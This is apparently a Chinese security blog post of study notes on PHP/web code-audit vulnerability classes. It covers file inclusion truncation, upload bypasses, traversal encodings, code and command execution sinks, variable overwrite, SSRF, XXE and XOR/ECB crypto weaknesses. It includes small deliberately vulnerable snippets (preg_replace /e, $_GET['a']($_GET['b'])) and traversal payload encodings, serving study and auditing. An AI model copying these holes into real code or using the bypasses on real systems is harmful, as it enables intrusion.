<p> &lt;&gt; 会被url转码，所以要bp修改一下 。<br> 发现apache的日志文件路径是重点<br>（6）文件包含截断<br>%00截断：<br>受限于GPC和addslashes等函数过滤，php5.3后，前面修复了该问题   </p>
<p>利用多个英文句号（.）和反斜杠（/）来截断：<br>window下240个（.）或者240个（./）,linux下2038个（/.）组合<br>不受gpc限制，php5.3之后被修复  </p>
<p>问号（?）来伪截断：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/1.txt == http://cfyqy.com/1.txt?.php</span><br></pre></td></tr></table></figure></p>
<p>不受gpc和php版本限制<br>3.jsp包含：<br>(1)静态包含<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">"page.txt"</span> %&gt;</span><br></pre></td></tr></table></figure></p>
<p>jsp语法规定：<br>include指令为静态包含，只允许包含一个已经存在于服务器中的文件，不能使用变量来控制包含某个文件，这意味着使用include指令，将不存在文件包含漏洞<br>(2)动态包含  </p>
<h2 id="2-文件读取漏洞"><a href="#2-文件读取漏洞" class="headerlink" title="2.文件读取漏洞"></a>2.文件读取漏洞</h2><p>审计时：文件读取的函数列表： file_put_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()，还可以利用文件包含include()，php输入输出留php://filter来读取函数   </p>
<h2 id="3-文件上传漏洞"><a href="#3-文件上传漏洞" class="headerlink" title="3.文件上传漏洞"></a>3.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md" target="_blank" rel="noopener">文件上传漏洞</a></h2><p>审计时： 上传函数move_uploaded_file()<br>php会对上传的文件创建临时的文件，其目录在php.ini 的upload_tmp_dir中定义，默认为空。linux下会使用tmp目录，windows下回使用c:\windows\tmp目录<br>1.<a href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/" target="_blank" rel="noopener">编译器上传漏洞</a><br>2.<a href="http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">绕过文件上传的检查功能</a><br>%00截断<br>白名单绕过<br>黑名单绕过<br>特殊文件名绕过<br>文件名大小写绕过<br>前端js绕过<br>文件头、content-type绕过<br>3.<a href="https://www.secfree.com/article-585.html" target="_blank" rel="noopener">文件上传漏洞的防御</a><br>文件上传的目录设置为不可执行<br>判断文件的类型<br>使用随机数改写文件名和文件路径<br>单独设置文件服务器的域名  </p>
<h2 id="4-文件解析漏洞"><a href="#4-文件解析漏洞" class="headerlink" title="4.文件解析漏洞"></a>4.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.md" target="_blank" rel="noopener">文件解析漏洞</a></h2><p>1.apache文件解析漏洞<br>2.iis文件解析问题<br>3.php cgi路径解析问题<br>附上一篇文章<br><a href="https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">服务器解析漏洞</a> </p>
<h2 id="5-文件删除漏洞"><a href="#5-文件删除漏洞" class="headerlink" title="5.文件删除漏洞"></a>5.文件删除漏洞</h2><p>审计时： 常出现的函数unlink()</p>
<h2 id="6-目录遍历漏洞"><a href="#6-目录遍历漏洞" class="headerlink" title="6.目录遍历漏洞"></a>6.目录遍历漏洞</h2><p>可以使用不同的编码来绕过一些服务端逻辑：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%2e%2e%2f 等同于../  </span><br><span class="line">%2e%2e    等同于../  </span><br><span class="line">..%2f     等同于../  </span><br><span class="line">%2e%2e%5c 等同于../</span><br><span class="line">%2e%2e    等同于..\</span><br><span class="line">%5c       等同于..\</span><br><span class="line">%252e%252e%255c  等同于../ </span><br><span class="line">..%255c  等同于..\and so on.</span><br></pre></td></tr></table></figure></p>
<p>某些web容器支持的编码方式；<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">..%c0%af 等同于../ </span><br><span class="line">../%c1%9c 等同于 ..\</span><br></pre></td></tr></table></figure></p>
<h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><p>用户可以通过请求将代码注入到应用中执行<br>审计时： eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()等过滤不严、另外还有php的动态函数（$a($b）也是目前出现比较多的<br>1.代码执行函数<br>(1)eval和assert函数<br>(2)preg_replace函数：<br>当$pattern 处存在e修饰符是，$replacement的值会被当成php代码执行。  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">preg_replace(<span class="string">"/\[(.*)\]/e"</span>, <span class="string">'\\1'</span>,<span class="variable">$_GET</span>[<span class="string">'str'</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>意思是从变量中搜索括号[]中间的内容作为第一组结果， ‘\1’代表用第一组结果填充<br>(3)调用函数过滤不严：<br>call_user_func()和array_map()等数十个函数有调用其他函数的功能 ，其中的一个为参数作为要调用的函数名，如果函数名可控，就可以调用意外的函数，还执行代码<br>2.动态代码执行<br>php的函数可以直接由字符串拼接。<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'a'</span>](<span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>意思是接受get请求的a参数作为函数，b参数作为函数的参数<br>3.Curly Syntax<br>执行花括号间的代码，并将结果给替换回去<br>例子<br>ls命令列出本地目录的文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$var</span>=<span class="string">"qian <span class="variable">$&#123;`ls`&#125;</span> ye"</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>4.<a href="https://www.anquanke.com/post/id/86452" target="_blank" rel="noopener">unserialize()导致代码执行</a><br>利用条件：<br>1.unserialize()参数用户可以控制<br>2.__destruct()函数或者   </p>
<p>__wakeup(0函数存在 </p>
<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md" target="_blank" rel="noopener">命令执行漏洞</a></h1><p>可以执行的系统或者应用指令的漏洞。<br>审计时：注意system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()等函数<br>1.命令执行函数<br>2.反引号命令执行<br>反引号执行命令调用的是shell_exec()函数<br>3.命令的连接符 &amp;、 &amp;&amp;、 |、||<br>4.命令防注入函数<br>escapeshellcms()过滤整条命令<br>escapeshellarg() 过滤参数   </p>
<h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a><a href="http://blog.csdn.net/Liuhuaijin/article/details/77331419" target="_blank" rel="noopener">变量覆盖漏洞</a></h1><p>用户自定义的参数可以替换程序原有的变量值。<br>审计时：注意的函数extract()和parse_str()<br>import_request_variables()<br>1.import_request_variables<br>将get、post、cookie中的变量导入到全局，第二个参数没有指定将导致变量覆盖<br>相当于开启全局变量注册，在php4~4.10和php5~5.40可用，php5.4后被取消<br>2.parse_str()<br>用于解析url的query string<br>3.extract()<br>将变量从数组导入当前的符号表<br>4.register_globals=on<br>变量将自动赋值，不用初始化，php4.20之后默认为off<br>5.$$变量覆盖  </p>
<h1 id="逻辑处理漏洞"><a href="#逻辑处理漏洞" class="headerlink" title="逻辑处理漏洞"></a>逻辑处理漏洞</h1><p>程序逻辑错误导致的  </p>
<h2 id="1-等于与存在判断绕过"><a href="#1-等于与存在判断绕过" class="headerlink" title="1.等于与存在判断绕过"></a>1.等于与存在判断绕过</h2><p>1.in_arrray(）函数<br>判断一个值是否在某个数组中<br>举个例子：<br>/?qianye=1q<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$_GET</span>[<span class="string">'qianye'</span>],array(1,2,3,4)))</span><br><span class="line">&#123;</span><br><span class="line">  //执行语句</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>2.is_numeric函数<br>当传入参数为hex时直接通过并返回true,而mysql是可以枝江使用hex编码代替字符串明文的。虽然不能直接注入sql语句，但是可能存在二次注入和xss等漏洞隐患。<br>3.双等于和三等于<br>双等于在判断等于之前会先做变量类型转换，而三等于不会   </p>
<h2 id="2-越权访问"><a href="#2-越权访问" class="headerlink" title="2.越权访问"></a>2.<a href="https://mp.weixin.qq.com/s/ChiXtcrEyQeLkGOkm4PTog" target="_blank" rel="noopener">越权访问</a></h2><h2 id="3-支付漏洞"><a href="#3-支付漏洞" class="headerlink" title="3.支付漏洞"></a>3.<a href="https://mp.weixin.qq.com/s/w22omfxO8vU6XzixXWmBxg" target="_blank" rel="noopener">支付漏洞</a></h2><h2 id="4-密码重置漏洞"><a href="#4-密码重置漏洞" class="headerlink" title="4.密码重置漏洞"></a>4.<a href="https://mp.weixin.qq.com/s/Lynmqd_ieEoNJ3mmyv9eQQ" target="_blank" rel="noopener">密码重置漏洞</a></h2><h1 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a><a href="">会话认证漏洞</a></h1><p>1.cookie攻击<br>2.session保持攻击</p>
<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/clickjacking.md" target="_blank" rel="noopener">点击劫持</a></h1><p>是一种视觉欺骗手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。   </p>
<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a><a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">ssrf</a></h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）    </p>
<h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><p>客户端所提交的数据未经检查就让web服务器去执行。   </p>
<h2 id="1-xml外部实体注入"><a href="#1-xml外部实体注入" class="headerlink" title="1.xml外部实体注入"></a>1.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">xml外部实体注入</a></h2><p>xml可扩展标识语言，主要用来传输数据，而非显示数据。   </p>
<h2 id="2-xpath注入"><a href="#2-xpath注入" class="headerlink" title="2.xpath注入"></a>2.<a href="http://www.freebuf.com/articles/web/23184.html" target="_blank" rel="noopener">xpath注入</a></h2><p>xpath即xml路径语言 </p>
<h2 id="3-jsonp注入"><a href="#3-jsonp注入" class="headerlink" title="3.jsonp注入"></a>3.<a href="http://www.freebuf.com/articles/web/126347.html" target="_blank" rel="noopener">jsonp注入</a></h2><p>JSON（JavaSript Object Notation）是一种轻量级的数据交换格式   </p>
<h1 id="加密算法与随机数"><a href="#加密算法与随机数" class="headerlink" title="加密算法与随机数"></a>加密算法与随机数</h1><p>常见的加密算法，为分组加密算法和流加密算法两种。<br>分组加密算法基于“分组”进行操作，代表算法有DES、3-DES、 Blowfish、 IDEA 、AES<br>流加密算法，每次只处理一个字节，密钥独立于消息之外，两者通过异或实现加密于解密，代表算法有RC4、ORYX、SEAL   </p>
<h2 id="1-Stream-Ciper-Attack"><a href="#1-Stream-Ciper-Attack" class="headerlink" title="1.Stream Ciper Attack"></a>1.Stream Ciper Attack</h2><p>1.Reused Key Attack<br>使用同一个密钥进行多次加密、解密。<br>假设有 密钥C,明文A,明文B,那么，XOR加密可表示为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E(A)=A xor C </span><br><span class="line">E(B)=B xor C</span><br></pre></td></tr></table></figure></p>
<p>密文是知道的，因此容易计算：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E(A) xor E(B) =(A xor C ) xor(B xor C )=A xor B</span><br></pre></td></tr></table></figure></p>
<p>此时只要知道3个便可以推算出剩下一个，密钥C完全不需要。<br>2.Bit-flipping Attack  </p>
<p>攻击者在不知道明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式。<br>通过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E(A) xor E(B) =A xor B</span><br></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A xor E(A) xor B= E(B)</span><br></pre></td></tr></table></figure></p>
<p>例子：<br>比如加入一个网站用cookie作为身份验证，cookie通过xor加密而来，明文假设为usenam+role ,便可通过注册一个账号，推导出管理员的cookie<br>常见解决方法，增加带有KEY的MAC,通过MAC验证密文是否被修改。通过哈希算法来实现的MAC，称为HMAC。<br>3.弱随机数iv. </p>
<h2 id="2-ECB模式缺陷"><a href="#2-ECB模式缺陷" class="headerlink" title="2.ECB模式缺陷"></a>2.ECB模式缺陷</h2><p>简单的分组加密，改变分组密文的顺序，将改变解密后的明文顺序；替换某个分组密文，解密后该对应分组的明文也会被替换，而其他分组不受影响。</p>
<h2 id="3-Padding-Oracle-Attack"><a href="#3-Padding-Oracle-Attack" class="headerlink" title="3.Padding Oracle Attack"></a>3.<a href="http://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">Padding Oracle Attack</a></h2><h2 id="4-伪随机数问题"><a href="#4-伪随机数问题" class="headerlink" title="4.伪随机数问题"></a>4.<a href="http://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/" target="_blank" rel="noopener">伪随机数问题</a></h2><p><a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">伪随机数的破解</a><br>伪随机数是由数学算法实现的，它真正随机的地方在于“种子”，种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得的值的顺序也是固定的。  </p>
<h2 id="5-Length-Extension-Attack"><a href="#5-Length-Extension-Attack" class="headerlink" title="5.Length Extension Attack"></a>5.<a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">Length Extension Attack</a></h2><h1 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a><a href="https://www.secpulse.com/archives/64088.html" target="_blank" rel="noopener">DDOS攻击</a></h1><p>利用合理的请求造成资源过载，导致服务不可用。 </p>
<p><br><br>粗略的整理一下，等以后接触更多了，再慢慢的补充。<br><br></p>
<p><br></p>
<p>参考文献:<br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">https://book.douban.com/subject/10546925/</a><br><a href="https://book.douban.com/subject/26673087/" target="_blank" rel="noopener">https://book.douban.com/subject/26673087/</a><br><a href="https://book.douban.com/subject/26348894/" target="_blank" rel="noopener">https://book.douban.com/subject/26348894/</a><br><a href="https://github.com/JnuSimba/MiscSecNotes" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes</a></p>

                
<p class="pink-link-context">
    <a href="/posts/49ca178a.html" rel="next" title="metasploit学习小记">
    Prev: metasploit学习小记
  </a>
</p>



<p class="pink-link-context">
    <a href="/posts/6faad9f0.html" rel="next" title="owasp juice shop">
    Next: owasp juice shop
  </a>
</p>


            </div>
			
        </div>
    </div>
</article>



    <script src="../../js/av-min.js"></script>
    <script src='../../js/Valine.min.js'></script>
	<div style="background-color: #FFFFFF">
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments' ,
			appId: 'ul15fj2BGxFoWtoSlntkMlMf-gzGzoHsz',
			appKey: 'vvdd3JD38t8gwf4ytlq3ON3H',
			notify: false, 
			verify: false, 
			avatar: 'wavatar', 
			placeholder: 'ε = = (づ′▽`)づ '
        })
    </script>
  </div>

</div>

		 
		 <script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>


<script>
(function($){$.fn.snow=function(options){var $flake=$('<div id="flake" />').css({'position':'absolute','top':'-50px'}).html('&#10052;'),documentHeight=$(document).height(),documentWidth=$(document).width(),defaults={minSize:10,maxSize:20,newOn:500,flakeColor:"#FFFFFF"},options=$.extend({},defaults,options);var interval=setInterval(function(){var startPositionLeft=Math.random()*documentWidth-100,startOpacity=0.5+Math.random(),sizeFlake=options.minSize+Math.random()*options.maxSize,endPositionTop=documentHeight-40,endPositionLeft=startPositionLeft-100+Math.random()*200,durationFall=documentHeight*10+Math.random()*5000;$flake.clone().appendTo('body').css({left:startPositionLeft,opacity:startOpacity,'font-size':sizeFlake,color:options.flakeColor}).animate({top:endPositionTop,left:endPositionLeft,opacity:0.2},durationFall,'linear',function(){$(this).remove()});},options.newOn);};})(jQuery);
$.fn.snow({ minSize: 10, maxSize: 60, newOn: 1000, flakeColor: '#FFF' });
</script>
        <div class="fixed-action-btn float-sitemap">
    <a class="btn-floating btn-large pink">
      <i class="fa fa-caret-square-o-up"></i>
    </a>
    <ul>
      <li><a class="btn-return-top btn-floating waves-effect green" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
    </ul>
  </div>

    </main>
    
  
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript" src="../../js/jquery.min.js"></script>
<script type="text/javascript" src="../../js/spig.js"></script>
<link rel="stylesheet" href="../../css/lib/spigPet.css" type="text/css"/>
<script type="text/javascript">
var isindex = true;
var visitor = true;
</script>


<div id="spig" class="spig">
    <div id="message"></div>
    <div id="mumu" class="mumu"></div>
</div>

 
<footer class="page-footer indigo darken-1">
    
    <div class="footer-container container">
        <div class="row">
            
            <div class="social-group col m4 s12">
                <h5 class="white-text">Social</h5>
                
                    <a class="social-link" href="#" target="_blank">
                        <i class="fa fa-2x fa-weibo"></i>
                    </a>
                
                    <a class="social-link" href="#" target="_blank">
                        <i class="fa fa-2x fa-github"></i>
                    </a>
                
                    <a class="social-link" href="/atom.xml" target="_blank">
                        <i class="fa fa-2x fa-rss"></i>
                    </a>
                
                
    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
    </script>
    <div class="site-visitors-container white-text">
        <span>
            <i class="fa fa-user"></i>
            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
        </span>
        <span>&nbsp;|&nbsp;</span>
        <span>
            <i class="fa fa-eye"></i>
            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
        </span>
    </div>


            </div>
            

            
            <div class="col m8 s12">
                <h5 class="white-text">Links</h5>
                
                    <a class="social-link" href="https://blog.csdn.net/Wuzebiao2016" target="_blank">wuzebiao</a>
                
                    <a class="social-link" href="http://www.ifuryst.com/" target="_blank">iFurySt</a>
                
                    <a class="social-link" href="http://daikersec.com/" target="_blank">daiker</a>
                
                    <a class="social-link" href="http://blog.dedsec.club" target="_blank">dedsec</a>
                
                    <a class="social-link" href="https://www.leavesongs.com/" target="_blank">离别歌</a>
                
                    <a class="social-link" href="https://www.sec-wiki.com/" target="_blank">Secwiki</a>
                
                    <a class="social-link" href="https://zhuanlan.kanxue.com/" target="_blank">看雪专栏</a>
                
                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
                
                    <a class="social-link" href="http://www.freebuf.com/" target="_blank">安全客</a>
                
                    <a class="social-link" href="https://yq.aliyun.com/articles/?spm=a2c4e.11155573.minheadermenu.3.6cd475c6d2FQvQ" target="_blank">云栖社区</a>
                
                    <a class="social-link" href="https://paper.seebug.org/" target="_blank">知道创宇</a>
                
                    <a class="social-link" href="https://www.waitalone.cn/pentest" target="_blank">独自等待</a>
                
                    <a class="social-link" href="https://3gstudent.github.io/3gstudent.github.io/" target="_blank">三好学生</a>
                
                    <a class="social-link" href="http://paper.tuisec.win/index.jsp" target="_blank">先知社区文章</a>
                
            </div>
            
        </div>
    </div>
    

    <div class="footer-copyright pink-link-context">
        <div class="container">
            © 2016 example.com, All rights reserved.
            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
        </div>
    </div>
</footer>


    <noscript>
    <div class="noscript">
        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
    </div>
</noscript>
<div class="noscript">
    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
</div>


<script src="/js/jquery.min.js"></script>
<script src="/js/materialize.min.js"></script>

<script>
    (function($) {
        $(document).ready(function() {
            // 隐藏禁用javascript（针对微信内置浏览器）的提示
            $('.noscript').hide();

            // 图片缩放效果
            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');

            // 给图片加上点击放大效果（materialbox插件）
            $imgs.addClass('materialboxed').each(function(i, el) {
                $(this).attr('data-caption', $(this).attr('alt') || ' ');
            }).materialbox();

            // 优化表格的显示
            $('table').each(function() {
                var $table = $(this);
                // 除去多行代码的情况
                if ($table.find('pre').length == 0) {
                    $table.addClass('responsive-table striped bordered');
                }
            });

            // 首页幻灯片
            $('.slider').slider({indicators: true, full_width: true, interval: 8000});

            $(".button-collapse").sideNav();
            $(".category-menu").sideNav();

            // 针对gallery post
            $('.carousel').carousel({full_width: true});
            $('.carousel-control.prev').click(function() {
                $('.carousel').carousel('prev');
            });
            $('.carousel-control.next').click(function() {
                $('.carousel').carousel('next');
            });

            // 文章目录
            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();

            // 目录随屏幕滚动（防止目录过长越过footer）
            var $toc = $('.toc');
            var scrollTargetTop = 0;
            $(window).scroll(function() {
                var $activeLink = $toc.find('a.active.section');
                if ($(window).scrollTop() < 100) {
                    scrollTargetTop = 0;
                } else {
                    if ($activeLink[0]) {
                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
                    }
                }
                $toc.css('top', '-' + scrollTargetTop + 'px');
            });

            // 修正文章目录的left-border颜色
            var color = $('.table-of-contents-text').css('color');
            $('.table-of-contents-link').css('border-left-color', color);

            // 针对移动端做的优化：FAB按钮点击一下收回
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                $('.fixed-action-btn').addClass('click-to-toggle');
            }
            // 回到顶部
            $('.btn-return-top').click(function() {
                $('body, html').animate({
                    scrollTop: 0
                }, 500);
            });

            // 重置读书页面的Tab标签页的颜色
            $('li.tab a').hover(function() {
                $(this).toggleClass('text-lighten-4');
            });
            $('.indicator').addClass('pink lighten-2');

            
            // 添加new标签
            $('menu-home, menu-archive, .menu-reading, .menu-about').append('<span class="new badge pink"></span>');
            

            // 搜索功能
            $('.modal-trigger').leanModal({
                // 打开搜索框时自动聚焦
                ready: function() {
                    if ($('#search').is(":visible")) {
                        $('#search-input').focus();
                    }
                }
            });
            var searchXml = "search.xml";
            if (searchXml.length == 0) {
             	searchXml = "search.xml";
            }
            var searchPath = "/" + searchXml;
            initSearch(searchPath, 'search-input', 'search-result');
        });

        // 初始化搜索与匹配函数
        var initSearch = function(path, search_id, content_id) {
            'use strict';
            $.ajax({
                url: path,
                dataType: "xml",
                success: function(xmlResponse) {
                    // get the contents from search data
                    var datas = $("entry", xmlResponse).map(function() {
                        return {
                            title: $("title", this).text(),
                            content: $("content", this).text(),
                            url: $("url", this).text()
                        };
                    }).get();
                    var $input = document.getElementById(search_id);
                    var $resultContent = document.getElementById(content_id);
                    $input.addEventListener('input', function() {
                        var str = '<ul class=\"search-result-list\">';
                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                        $resultContent.innerHTML = "";
                        if (this.value.trim().length <= 0) {
                            return;
                        }
                        // perform local searching
                        datas.forEach(function(data) {
                            var isMatch = true;
                            var content_index = [];
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty titles and contents
                            if (data_title != '' && data_content != '') {
                                keywords.forEach(function(keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);
                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            }
                            // show search results
                            if (isMatch) {
                                keywords.forEach(function(keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                });

                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 100 characters
                                    var start = first_occur - 20;
                                    var end = first_occur + 80;
                                    if (start < 0) {
                                        start = 0;
                                    }
                                    if (start == 0) {
                                        end = 100;
                                    }
                                    if (end > content.length) {
                                        end = content.length;
                                    }
                                    var match_content = content.substring(start, end);
                                    // highlight all keywords
                                    keywords.forEach(function(keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                    });

                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        $resultContent.innerHTML = str;
                    });
                }
            });
        }
    })(jQuery);
</script>


<script src="/js/prettify.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
        $("pre").addClass("prettyprint");
        prettyPrint();
    });
</script>


<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-124439084-1', 'auto');
    ga('send', 'pageview');

</script>





<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>
<script type="text/javascript" async
  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
</script>



	
<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
<script>
  daovoice('init', {
    app_id: "45fb937d",
  });
  daovoice('update');
</script>	
</body>
</html>
